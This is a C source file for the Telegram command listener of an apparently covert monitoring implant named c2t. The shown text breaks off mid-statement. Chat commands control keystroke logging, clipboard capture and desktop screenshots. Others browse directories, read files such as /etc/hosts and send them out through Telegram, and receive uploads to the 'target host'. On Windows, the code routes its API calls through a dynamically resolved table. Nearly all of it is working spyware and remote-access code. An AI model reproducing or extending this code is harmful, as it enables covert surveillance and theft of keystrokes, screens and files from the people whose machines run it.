/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "telegram_listener.h"
#include "../clipboard/clipboard_output.h"
#include "../config/config.h"
#include "../files/files.h"
#include "../keyboard/keyboard.h"
#include "../keyboard/keyboard_output.h"
#include "../logging/log_sender.h"
#include "../logging/logging.h"
#include "../runtime/runtime.h"
#include "../screenshot/screenshot.h"
#include "../screenshot/screenshot_output.h"
#include "telegram.h"
#include "telegram_platform.h"

#include <ctype.h>
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef _WIN32
#include <pthread.h>
#include <unistd.h>
#else
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "../win32/win32_api.h"

static HANDLE c2t_CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,
                               SIZE_T dwStackSize,
                               LPTHREAD_START_ROUTINE lpStartAddress,
                               LPVOID lpParameter, DWORD dwCreationFlags,
                               LPDWORD lpThreadId) {
  c2t_win32_api_init();
  if (g_c2t_win32.CreateThread)
    return g_c2t_win32.CreateThread(lpThreadAttributes, dwStackSize,
                                    lpStartAddress, lpParameter,
                                    dwCreationFlags, lpThreadId);
  return NULL;
}
static DWORD c2t_WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {
  c2t_win32_api_init();
  if (g_c2t_win32.WaitForSingleObject)
    return g_c2t_win32.WaitForSingleObject(hHandle, dwMilliseconds);
  return WAIT_FAILED;
}
static BOOL c2t_CloseHandle(HANDLE hObject) {
  c2t_win32_api_init();
  if (g_c2t_win32.CloseHandle)
    return g_c2t_win32.CloseHandle(hObject);
  return FALSE;
}
static VOID c2t_Sleep(DWORD dwMilliseconds) {
  c2t_win32_api_init();
  if (g_c2t_win32.Sleep)
    g_c2t_win32.Sleep(dwMilliseconds);
}

#define CreateThread c2t_CreateThread
#define WaitForSingleObject c2t_WaitForSingleObject
#define CloseHandle c2t_CloseHandle
#define Sleep c2t_Sleep
#endif

#define POLL_TIMEOUT_SECONDS 15

static int listener_started;
static volatile int stopping;
static int64_t listener_start_time;

#ifdef _WIN32
static HANDLE listener_thread;
#else
static pthread_t listener_thread;
#endif

#ifndef _WIN32
#include <strings.h>
#endif

static int c2t_strcasecmp(const char *left, const char *right) {
#ifdef _WIN32
  return _stricmp(left, right);
#else
  return strcasecmp(left, right);
#endif
}

[[nodiscard]] static int match_command(const char *text, const char *cmd) {
  if (!text || !cmd)
    return 0;
  while (isspace((unsigned char)*text))
    text++;
  if (*text == '/')
    text++;
  if (*cmd == '/')
    cmd++;

  while (*cmd) {
    char c1 = *text;
    char c2 = *cmd;
    if (c1 == '-')
      c1 = '_';
    if (c2 == '-')
      c2 = '_';
    if (tolower((unsigned char)c1) != tolower((unsigned char)c2))
      return 0;
    text++;
    cmd++;
  }

  char next = *text;
  return (next == '\0' || next == '@' || isspace((unsigned char)next));
}

static const char *get_command_argument(const char *text) {
  if (!text)
    return "";
  while (isspace((unsigned char)*text))
    text++;
  if (*text == '/')
    text++;
  while (*text && !isspace((unsigned char)*text))
    text++;
  while (isspace((unsigned char)*text))
    text++;
  return text;
}

static void format_metric_bytes(uint64_t b, char *out, size_t cap) {
  if (!out || cap == 0)
    return;
  if (b < 1024) {
    snprintf(out, cap, "%llu B", (unsigned long long)b);
  } else if (b < 1024 * 1024) {
    snprintf(out, cap, "%.1f KB (%llu B)", (double)b / 1024.0,
             (unsigned long long)b);
  } else if (b < 1024ULL * 1024 * 1024) {
    snprintf(out, cap, "%.2f MB (%llu bytes)", (double)b / (1024.0 * 1024.0),
             (unsigned long long)b);
  } else {
    snprintf(out, cap, "%.2f GB (%llu bytes)",
             (double)b / (1024.0 * 1024.0 * 1024.0), (unsigned long long)b);
  }
}

static void handle_command(const telegram_incoming_update_t *update,
                           const char *chat_id,
                           [[maybe_unused]] const char *username) {
  const char *text = update && update->text ? update->text : "";
  const c2t_config_t *config = c2t_config_get();
  if (!config->telegram_chat_id || !*config->telegram_chat_id) {
    c2t_log_warning("listener", "Telegram chat_id is not configured");
    return;
  }

  const char *cfg_chat = config->telegram_chat_id;
  while (isspace((unsigned char)*cfg_chat))
    cfg_chat++;
  while (isspace((unsigned char)*chat_id))
    chat_id++;

  if (strcmp(chat_id, cfg_chat) != 0) {
    c2t_log_warning(
        "listener",
        "Ignored command '%s' from unauthorized chat_id: %s (authorized: %s)",
        text, chat_id, cfg_chat);
    return;
  }

  c2t_log_info("listener", "Executing Telegram command '%s' from chat %s", text,
               chat_id);

  if (match_command(text, "pause") || match_command(text, "mute") ||
      match_command(text, "stop_listen") || match_command(text, "disable")) {
    int kb_enabled = !config->disable_keyboard;
    int clip_enabled = !config->disable_clipboard;
    int shot_enabled = !config->disable_screenshot;
    if (!kb_enabled && !clip_enabled && !shot_enabled) {
      telegram_send_html(
          "⚠️ <b>All Monitoring Disabled</b>\n<i>Clipboard, keyboard, and "
          "screenshot subsystems are disabled in configuration.</i>");
    } else {
      if (clip_enabled)
        clipboard_set_paused(1);
      if (kb_enabled)
        keyboard_set_paused(1);
      if (shot_enabled)
        screenshot_set_paused(1);
      c2t_log_info("listener", "Monitoring paused by Telegram command");
      telegram_send_html(
          "⏸️ <b>Monitoring Paused</b>\n<i>All active monitoring captures "
          "are paused until resumed with /resume or /toggle.</i>");
    }
  } else if (match_command(text, "resume") || match_command(text, "unmute") ||
             match_command(text, "start_listen") ||
             match_command(text, "enable")) {
    int kb_enabled = !config->disable_keyboard;
    int clip_enabled = !config->disable_clipboard;
    int shot_enabled = !config->disable_screenshot;
    if (!kb_enabled && !clip_enabled && !shot_enabled) {
      telegram_send_html(
          "⚠️ <b>All Monitoring Disabled</b>\n<i>Clipboard, keyboard, and "
          "screenshot subsystems are disabled in configuration.</i>");
    } else {
      if (clip_enabled)
        clipboard_set_paused(0);
      if (kb_enabled)
        keyboard_set_paused(0);
      if (shot_enabled)
        screenshot_set_paused(0);
      c2t_log_info("listener", "Monitoring resumed by Telegram command");
      telegram_send_html(
          "▶️ <b>Monitoring Resumed</b>\n<i>c2t is actively capturing and "
          "forwarding events.</i>");
    }
  } else if (match_command(text, "toggle")) {
    int kb_enabled = !config->disable_keyboard;
    int clip_enabled = !config->disable_clipboard;
    int shot_enabled = !config->disable_screenshot;
    if (!kb_enabled && !clip_enabled && !shot_enabled) {
      telegram_send_html(
          "⚠️ <b>All Monitoring Disabled</b>\n<i>Clipboard, keyboard, and "
          "screenshot subsystems are disabled in configuration.</i>");
    } else {
      int clip_paused = clip_enabled ? clipboard_is_paused() : 1;
      int key_paused = kb_enabled ? keyboard_is_paused() : 1;
      int shot_paused = shot_enabled ? screenshot_is_paused() : 1;
      int target = !(clip_paused && key_paused && shot_paused);
      if (clip_enabled)
        clipboard_set_paused(target);
      if (kb_enabled)
        keyboard_set_paused(target);
      if (shot_enabled)
        screenshot_set_paused(target);
      c2t_log_info("listener", "Monitoring toggled to %s by Telegram command",
                   target ? "paused" : "active");
      if (target) {
        telegram_send_html("⏸️ <b>Monitoring Paused</b>\n<i>All active "
                           "monitoring is now paused.</i>");
      } else {
        telegram_send_html("▶️ <b>Monitoring Resumed</b>\n<i>All active "
                           "monitoring is now running.</i>");
      }
    }
  } else if (match_command(text, "clipboard_on") ||
             match_command(text, "clipboard_enable") ||
             match_command(text, "clipboard_resume") ||
             match_command(text, "clipboard_start") ||
             match_command(text, "unmute_clipboard") ||
             match_command(text, "resume_clipboard")) {
    if (config->disable_clipboard) {
      telegram_send_html(
          "⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is "
          "disabled in daemon configuration (--no-clipboard).</i>");
    } else {
      clipboard_set_paused(0);
      c2t_log_info("listener",
                   "Clipboard monitoring resumed by Telegram command");
      telegram_send_html(
          "▶️ <b>Clipboard Monitoring Resumed</b>\n<i>Clipboard listener is "
          "actively capturing clipboard events.</i>");
    }
  } else if (match_command(text, "clipboard_off") ||
             match_command(text, "clipboard_disable") ||
             match_command(text, "clipboard_pause") ||
             match_command(text, "clipboard_stop") ||
             match_command(text, "mute_clipboard") ||
             match_command(text, "pause_clipboard")) {
    if (config->disable_clipboard) {
      telegram_send_html(
          "⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is "
          "disabled in daemon configuration (--no-clipboard).</i>");
    } else {
      clipboard_set_paused(1);
      c2t_log_info("listener",
                   "Clipboard monitoring paused by Telegram command");
      telegram_send_html("⏸️ <b>Clipboard Monitoring Paused</b>\n<i>Clipboard "
                         "event capturing is currently muted.</i>");
    }
  } else if (match_command(text, "clipboard_toggle")) {
    if (config->disable_clipboard) {
      telegram_send_html(
          "⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is "
          "disabled in daemon configuration (--no-clipboard).</i>");
    } else {
      int p = clipboard_toggle_paused();
      c2t_log_info("listener",
                   "Clipboard monitoring toggled to %s by Telegram command",
                   p ? "paused" : "active");
      if (p) {
        telegram_send_html("⏸️ <b>Clipboard Monitoring Paused</b>\n<i>Clipboard "
                           "capturing is currently muted.</i>");
      } else {
        telegram_send_html(
            "▶️ <b>Clipboard Monitoring Resumed</b>\n<i>Clipboard listener is "
            "actively capturing events.</i>");
      }
    }
  } else if (match_command(text, "clipboard_flush")) {
    if (config->disable_clipboard) {
      telegram_send_html(
          "⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is "
          "disabled in daemon configuration (--no-clipboard).</i>");
    } else {
      clipboard_output_flush();
      c2t_log_info(
          "listener",
          "Flushing clipboard queue on-demand by /clipboard_flush command");
      telegram_send_html("⚡ <b>Clipboard Queue Flushed</b>\n<i>Worker "
                         "signaled to process any queued clipboard items.</i>");
    }
  } else if (match_command(text, "clipboard_status") ||
             match_command(text, "clipboard")) {
    if (config->disable_clipboard) {
      telegram_send_html(
          "⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is "
          "disabled in daemon configuration (--no-clipboard).</i>");
    } else {
      char stat_msg[1024];
      clipboard_get_status_info(stat_msg, sizeof(stat_msg));
      telegram_send_html(stat_msg);
    }
  } else if (match_command(text, "clipboard_help")) {
    if (config->disable_clipboard) {
      telegram_send_html(
          "⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is "
          "disabled in daemon configuration (--no-clipboard).</i>");
    } else {
      char clip_help[1024];
      snprintf(
          clip_help, sizeof(clip_help),
          "📋 <b>Clipboard Control Commands</b>\n\n"
          "• <code>/clipboard_on</code> - Enable clipboard capturing\n"
          "• <code>/clipboard_off</code> - Pause clipboard capturing\n"
          "• <code>/clipboard_toggle</code> - Toggle active / paused state\n"
          "• <code>/clipboard_status</code> - View clipboard monitor &amp; "
          "queue state\n"
          "• <code>/clipboard_flush</code> - Signal immediate delivery of "
          "pending items\n\n"
          "💡 <i>Tip: Commands also accept dash syntax (e.g. "
          "<code>/clipboard-status</code>)</i>");
      telegram_send_html(clip_help);
    }
  } else if (match_command(text, "keyboard_devices") ||
             match_command(text, "keyboard_list") ||
             match_command(text, "keyboards")) {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      char dev_list[2048];
      if (keyboard_get_device_list(dev_list, sizeof(dev_list))) {
        telegram_send_html(dev_list);
      } else {
        telegram_send_html("⚠️ <i>Unable to query keyboard devices.</i>");
      }
    }
  } else if (match_command(text, "keyboard_select") ||
             match_command(text, "keyboard_device") ||
             match_command(text, "keyboard_target")) {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      const char *arg = get_command_argument(text);
      if (!arg || !*arg) {
        telegram_send_html(
            "⚠️ <b>Usage:</b> <code>/keyboard_select "
            "&lt;id|name|all&gt;</code>\n"
            "<i>Example:</i> <code>/keyboard_select 0</code> or "
            "<code>/keyboard_select all</code>\n"
            "<i>Use <code>/keyboard_list</code> to see available devices.</i>");
      } else {
        char target_buf[128];
        size_t tlen = 0;
        while (arg[tlen] && !isspace((unsigned char)arg[tlen]) &&
               tlen + 1 < sizeof(target_buf)) {
          target_buf[tlen] = arg[tlen];
          tlen++;
        }
        target_buf[tlen] = '\0';

        (void)keyboard_select_device(target_buf);
        char resp[512];
        snprintf(resp, sizeof(resp),
                 "🎯 <b>Keyboard Target Selected:</b> <code>%s</code>\n"
                 "<i>Capturing only keystrokes matching target '%s'.</i>",
                 target_buf, target_buf);
        telegram_send_html(resp);
      }
    }
  } else if (match_command(text, "keyboard_on") ||
             match_command(text, "keyboard_enable") ||
             match_command(text, "keyboard_resume") ||
             match_command(text, "keyboard_start") ||
             match_command(text, "unmute_keyboard") ||
             match_command(text, "resume_keyboard")) {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      keyboard_set_paused(0);
      c2t_log_info("listener",
                   "Keyboard monitoring resumed by Telegram command");
      telegram_send_html("▶️ <b>Keyboard Monitoring Resumed</b>\n<i>Keyboard "
                         "listener is now capturing keystrokes.</i>");
    }
  } else if (match_command(text, "keyboard_off") ||
             match_command(text, "keyboard_disable") ||
             match_command(text, "keyboard_pause") ||
             match_command(text, "keyboard_stop") ||
             match_command(text, "mute_keyboard") ||
             match_command(text, "pause_keyboard")) {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      keyboard_set_paused(1);
      c2t_log_info("listener",
                   "Keyboard monitoring paused by Telegram command");
      telegram_send_html("⏸️ <b>Keyboard Monitoring Paused</b>\n<i>Keystroke "
                         "capturing is currently muted.</i>");
    }
  } else if (match_command(text, "keyboard_toggle")) {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      int p = keyboard_toggle_paused();
      c2t_log_info("listener",
                   "Keyboard monitoring toggled to %s by Telegram command",
                   p ? "paused" : "active");
      if (p) {
        telegram_send_html("⏸️ <b>Keyboard Monitoring Paused</b>\n<i>Keystroke "
                           "capturing is currently muted.</i>");
      } else {
        telegram_send_html("▶️ <b>Keyboard Monitoring Resumed</b>\n<i>Keyboard "
                           "listener is now capturing keystrokes.</i>");
      }
    }
  } else if (match_command(text, "keyboard_mode")) {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      const char *arg = get_command_argument(text);
      if (match_command(arg, "code") || match_command(arg, "pretty") ||
          match_command(arg, "block")) {
        keyboard_set_format_mode(KEYBOARD_MODE_CODE);
        c2t_log_info("listener", "Keyboard format mode set to CODE");
        telegram_send_html("🎨 <b>Keyboard Mode Set:</b> <code>Code Block "
                           "(&lt;pre&gt;&lt;code&gt;)</code>\n"
                           "<i>Keystrokes will be formatted inside structured "
                           "code blocks.</i>");
      } else if (match_command(arg, "raw") || match_command(arg, "plain") ||
                 match_command(arg, "text")) {
        keyboard_set_format_mode(KEYBOARD_MODE_RAW);
        c2t_log_info("listener", "Keyboard format mode set to RAW");
        telegram_send_html(
            "📝 <b>Keyboard Mode Set:</b> <code>Raw Plain Text</code>\n"
            "<i>Keystrokes will be delivered as plain unformatted text.</i>");
      } else {
        int cur = keyboard_get_format_mode();
        char resp[512];
        snprintf(resp, sizeof(resp),
                 "🎨 <b>Current Keyboard Format:</b> %s\n\n"
                 "<b>Usage:</b>\n"
                 "• <code>/keyboard_mode code</code> - Formatted code blocks\n"
                 "• <code>/keyboard_mode raw</code> - Plain text raw output",
                 cur == KEYBOARD_MODE_CODE
                     ? "<code>Code Block (&lt;pre&gt;&lt;code&gt;)</code>"
                     : "<code>Raw Text</code>");
        telegram_send_html(resp);
      }
    }
  } else if (match_command(text, "keyboard_flush")) {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      keyboard_output_flush();
      c2t_log_info(
          "listener",
          "Flushing keyboard buffer on-demand by /keyboard_flush command");
      telegram_send_html("⚡ <b>Keyboard Buffer Flushed</b>\n<i>Pending "
                         "keystrokes have been dispatched.</i>");
    }
  } else if (match_command(text, "keyboard_status") ||
             match_command(text, "keyboard")) {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      char stat_msg[1024];
      keyboard_get_status_info(stat_msg, sizeof(stat_msg));
      telegram_send_html(stat_msg);
    }
  } else if (match_command(text, "keyboard_layout") ||
             match_command(text, "keyboard_layouts") ||
             match_command(text, "layout") || match_command(text, "layouts")) {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      const char *arg = get_command_argument(text);
      if (!arg || !*arg) {
        char cur_layout[128] = "Unknown";
        keyboard_get_layout(cur_layout, sizeof(cur_layout));
        char avail_layouts[1024];
        keyboard_get_available_layouts(avail_layouts, sizeof(avail_layouts));
        char resp[1500];
        snprintf(resp, sizeof(resp),
                 "⌨️ <b>Active Layout:</b> %s\n\n"
                 "%s\n"
                 "💡 <b>To switch:</b> <code>/keyboard_layout "
                 "&lt;code&gt;</code> (e.g. <code>/keyboard_layout it</code>)",
                 cur_layout, avail_layouts);
        telegram_send_html(resp);
      } else {
        char code_buf[32];
        size_t clen = 0;
        while (arg[clen] && !isspace((unsigned char)arg[clen]) &&
               clen + 1 < sizeof(code_buf)) {
          code_buf[clen] = arg[clen];
          clen++;
        }
        code_buf[clen] = '\0';

        if (keyboard_set_layout(code_buf)) {
          char new_layout[128] = "Unknown";
          keyboard_get_layout(new_layout, sizeof(new_layout));
          char resp[512];
          snprintf(resp, sizeof(resp),
                   "🌐 <b>Keyboard Layout Updated:</b> %s\n"
                   "<i>Keystrokes will now be translated using the selected "
                   "layout.</i>",
                   new_layout);
          telegram_send_html(resp);
        } else {
          char avail_layouts[1024];
          keyboard_get_available_layouts(avail_layouts, sizeof(avail_layouts));
          char resp[1200];
          snprintf(resp, sizeof(resp),
                   "⚠️ <b>Invalid Layout Code:</b> <code>%s</code>\n\n%s",
                   code_buf, avail_layouts);
          telegram_send_html(resp);
        }
      }
    }
  } else if (match_command(text, "keyboard_shortcuts") ||
             match_command(text, "keyboard_shortcut") ||
             match_command(text, "shortcuts") ||
             match_command(text, "shortcut")) {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      const char *arg = get_command_argument(text);
      if (arg && *arg) {
        while (isspace((unsigned char)*arg))
          arg++;
        if (c2t_strcasecmp(arg, "on") == 0 || c2t_strcasecmp(arg, "1") == 0 ||
            c2t_strcasecmp(arg, "enable") == 0 ||
            c2t_strcasecmp(arg, "start") == 0) {
          keyboard_set_shortcuts_enabled(1);
          telegram_send_html(
              "⌨️ <b>Keyboard Shortcuts Capture:</b> 🟢 "
              "<b>ENABLED</b>\n<i>Modifier shortcuts ([Ctrl+C], [Alt+Tab], "
              "etc.) and special keys will now be captured.</i>");
        } else if (c2t_strcasecmp(arg, "off") == 0 ||
                   c2t_strcasecmp(arg, "0") == 0 ||
                   c2t_strcasecmp(arg, "disable") == 0 ||
                   c2t_strcasecmp(arg, "stop") == 0) {
          keyboard_set_shortcuts_enabled(0);
          telegram_send_html(
              "⌨️ <b>Keyboard Shortcuts Capture:</b> ⚪ "
              "<b>DISABLED</b>\n<i>Clean typing text mode active: modifier "
              "tags and special key tags are suppressed.</i>");
        } else if (c2t_strcasecmp(arg, "toggle") == 0) {
          int s = keyboard_toggle_shortcuts();
          char resp[256];
          snprintf(resp, sizeof(resp),
                   "⌨️ <b>Keyboard Shortcuts Capture:</b> %s",
                   s ? "🟢 <b>ENABLED</b> (Capturing shortcuts)"
                     : "⚪ <b>DISABLED</b> (Clean typing text only)");
          telegram_send_html(resp);
        } else {
          telegram_send_html("⚠️ <b>Usage:</b> <code>/keyboard_shortcuts "
                             "&lt;on|off|toggle&gt;</code>");
        }
      } else {
        int s = keyboard_get_shortcuts_enabled();
        char resp[512];
        snprintf(resp, sizeof(resp),
                 "⌨️ <b>Keyboard Shortcuts Capture:</b> %s\n\n"
                 "• <code>/keyboard_shortcuts on</code> - Capture [Ctrl+C], "
                 "[Alt+Tab], and special keys\n"
                 "• <code>/keyboard_shortcuts off</code> - Clean typing text "
                 "only (suppress tags)\n"
                 "• <code>/keyboard_shortcuts toggle</code> - Toggle state",
                 s ? "🟢 <b>ENABLED</b>" : "⚪ <b>DISABLED (Default)</b>");
        telegram_send_html(resp);
      }
    }
  } else if (match_command(text, "keyboard_help")) {
    if (config->disable_keyboard) {
      telegram_send_html(
          "⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is "
          "disabled in daemon configuration (--no-keyboard).</i>");
    } else {
      char kb_help[1200];
      snprintf(
          kb_help, sizeof(kb_help),
          "⌨️ <b>Keyboard Control Commands</b>\n\n"
          "• <code>/keyboard_list</code> - View detected keyboard devices "
          "&amp; status\n"
          "• <code>/keyboard_select &lt;id|all&gt;</code> - Filter capture to "
          "a specific keyboard\n"
          "• <code>/keyboard_layout [code]</code> - View or change keyboard "
          "layout\n"
          "• <code>/keyboard_shortcuts &lt;on|off|toggle&gt;</code> - "
          "Enable/disable shortcuts &amp; special keys\n"
          "• <code>/keyboard_on</code> - Enable keyboard capturing\n"
          "• <code>/keyboard_off</code> - Pause keyboard capturing\n"
          "• <code>/keyboard_toggle</code> - Toggle active / paused state\n"
          "• <code>/keyboard_mode &lt;code|raw&gt;</code> - Change output "
          "formatting\n"
          "• <code>/keyboard_flush</code> - Flush buffered keys to Telegram "
          "immediately\n"
          "• <code>/keyboard_status</code> - View keyboard monitor state &amp; "
          "buffer status\n\n"
          "💡 <i>Tip: Commands also accept dash syntax (e.g. "
          "<code>/keyboard-shortcuts off</code>)</i>");
      telegram_send_html(kb_help);
    }
  } else if (match_command(text, "getfile") || match_command(text, "file") ||
             match_command(text, "download") || match_command(text, "fetch") ||
             match_command(text, "get")) {
    const char *arg = get_command_argument(text);
    if (!arg || !*arg) {
      telegram_send_html(
          "⚠️ <b>Usage:</b> <code>/getfile &lt;file_path&gt;</code>\n"
          "<i>Example:</i> <code>/getfile /etc/hosts</code> or <code>/getfile "
          "\"C:\\path\\file.txt\"</code>\n"
          "<i>Use <code>/ls</code> to explore directories.</i>");
    } else {
      c2t_log_info("listener",
                   "Retrieving file '%s' on-demand by Telegram command", arg);
      (void)c2t_file_send_path(arg, nullptr);
    }
  } else if (match_command(text, "ls") || match_command(text, "dir") ||
             match_command(text, "list")) {
    const char *arg = get_command_argument(text);
    char list_resp[3800];
    c2t_log_info("listener",
                 "Listing directory '%s' on-demand by Telegram command",
                 (arg && *arg) ? arg : ".");
    if (c2t_file_list_directory(arg, list_resp, sizeof(list_resp))) {
      telegram_send_html(list_resp);
    } else {
      if (list_resp[0]) {
        telegram_send_html(list_resp);
      } else {
        telegram_send_html("⚠️ <i>Unable to list directory.</i>");
      }
    }
  } else if (match_command(text, "cat") || match_command(text, "view") ||
             match_command(text, "read") || match_command(text, "preview")) {
    const char *arg = get_command_argument(text);
    if (!arg || !*arg) {
      telegram_send_html("⚠️ <b>Usage:</b> <code>/cat &lt;file_path&gt;</code>\n"
                         "<i>Example:</i> <code>/cat /etc/os-release</code>\n"
                         "<i>Use <code>/getfile</code> for full download or "
                         "binary files.</i>");
    } else {
      char preview_resp[3800];
      c2t_log_info(
          "listener",
          "Reading text preview for '%s' on-demand by Telegram command", arg);
      if (c2t_file_read_text_preview(arg, preview_resp, sizeof(preview_resp),
                                     3000)) {
        telegram_send_html(preview_resp);
      } else {
        if (preview_resp[0]) {
          telegram_send_html(preview_resp);
        } else {
          telegram_send_html("⚠️ <i>Unable to read file preview.</i>");
        }
      }
    }
  } else if (match_command(text, "fileinfo") ||
             match_command(text, "file_info") || match_command(text, "stat")) {
    const char *arg = get_command_argument(text);
    if (!arg || !*arg) {
      telegram_send_html("⚠️ <b>Usage:</b> <code>/fileinfo &lt;path&gt;</code>\n"
                         "<i>Example:</i> <code>/fileinfo /etc/hosts</code>");
    } else {
      char info_resp[1024];
      c2t_log_info("listener",
                   "Querying file info for '%s' on-demand by Telegram command",
                   arg);
      if (c2t_file_get_info(arg, info_resp, sizeof(info_resp))) {
        telegram_send_html(info_resp);
      } else {
        if (info_resp[0]) {
          telegram_send_html(info_resp);
        } else {
          telegram_send_html("⚠️ <i>Unable to retrieve file info.</i>");
        }
      }
    }
  } else if (match_command(text, "upload") || match_command(text, "put") ||
             match_command(text, "sendfile") || match_command(text, "upfile")) {
    telegram_send_html(
        "📤 <b>Upload File to Host</b>\n\n"
        "To upload a file to the target host machine:\n"
        "1. Attach and send any file or document in this chat.\n"
        "2. <i>(Optional)</i> Add a caption with the destination path (e.g. "
        "<code>/tmp/dest.txt</code> or <code>C:\\temp\\</code>).\n"
        "3. If no caption is given, the file is saved in the working "
        "directory.\n\n"
        "💡 <i>Use <code>/ls</code> to explore directories or "
        "<code>/getfile</code> to download.</i>");
  } else if (match_command(text, "logs") || match_command(text, "log")) {
    c2t_log_info("listener", "Flushing logs on-demand by /logs command");
    c2t_log_sender_dispatch_now();
  } else if (match_command(text, "screenshot") ||
             match_command(text, "screen") ||
             match_command(text, "shot") ||
             match_command(text, "capture")) {
    if (config->disable_screenshot) {
      telegram_send_html(
          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
          "is disabled in daemon configuration (--no-screenshot).</i>");
    } else {
      const char *arg = get_command_argument(text);
      if (arg && *arg) {
        c2t_log_info("listener",
                     "Capturing desktop screenshot on-demand for display '%s'", arg);
        if (!screenshot_capture_display_and_send(arg, "📸 Desktop Screenshot")) {
          telegram_send_html(
              "⚠️ <b>Screenshot Capture Failed</b>\n<i>Unable to capture target "
              "display on host (check display ID and permissions).</i>");
        }
      } else {
        c2t_log_info("listener",
                     "Capturing desktop screenshot on-demand by Telegram command");
        if (!screenshot_capture_and_send("📸 Desktop Screenshot")) {
          telegram_send_html(
              "⚠️ <b>Screenshot Capture Failed</b>\n<i>Unable to capture desktop "
              "screen on target host (check permissions or active display session).</i>");
        }
      }
    }
  } else if (match_command(text, "screenshot_displays") ||
             match_command(text, "screens") ||
             match_command(text, "monitors") ||
             match_command(text, "displays")) {
    if (config->disable_screenshot) {
      telegram_send_html(
          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
          "is disabled in daemon configuration (--no-screenshot).</i>");
    } else {
      char disp_buf[1500];
      (void)screenshot_get_display_list(disp_buf, sizeof(disp_buf));
      telegram_send_html(disp_buf);
    }
  } else if (match_command(text, "screenshot_select") ||
             match_command(text, "screen_select") ||
             match_command(text, "display_select")) {
    if (config->disable_screenshot) {
      telegram_send_html(
          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
          "is disabled in daemon configuration (--no-screenshot).</i>");
    } else {
      const char *arg = get_command_argument(text);
      if (!arg || !*arg) {
        char cur_target[64] = "all";
        screenshot_get_selected_display(cur_target, sizeof(cur_target));
        char resp[512];
        snprintf(resp, sizeof(resp),
                 "🎯 <b>Current Target Display:</b> <code>%s</code>\n\n"
                 "⚠️ <b>Usage:</b> <code>/screenshot_select &lt;id|all&gt;</code>\n"
                 "<i>Example:</i> <code>/screenshot_select 0</code> or <code>/screenshot_select all</code>\n"
                 "<i>Use <code>/screenshot_displays</code> to view available screens.</i>",
                 cur_target);
        telegram_send_html(resp);
      } else {
        (void)screenshot_select_display(arg);
        char resp[512];
        snprintf(resp, sizeof(resp),
                 "🎯 <b>Target Display Updated:</b> <code>%s</code>\n"
                 "<i>Future screenshot captures will target: <b>%s</b></i>",
                 arg, arg);
        telegram_send_html(resp);
      }
    }
  } else if (match_command(text, "screenshot_timer") ||
             match_command(text, "screenshot_interval")) {
    if (config->disable_screenshot) {
      telegram_send_html(
          "⚠️ <b>Screenshot Capture Disabled</b>\n<i>Screenshot functionality "
          "is disabled in daemon configuration (--no-screenshot).</i>");
    } else {
      const char *arg = get_command_argument(text);
      if (!arg || !*arg) {
        size_t cur = screenshot_get_interval();
        char resp[512];
        snprintf(resp, sizeof(resp),
                 "📸 <b>Periodic Screenshot Timer:</b> %llu s (%s)\n\n"
                 "💡 <b>To change:</b> <code>/screenshot_timer &lt;sec&gt;</code> "
                 "(e.g. <code>/screenshot_timer 60</code> or <code>/screenshot_timer 0</code> to disable)",
                 (unsigned long long)cur, cur > 0 ? "🟢 Enabled" : "⚪ Disabled");
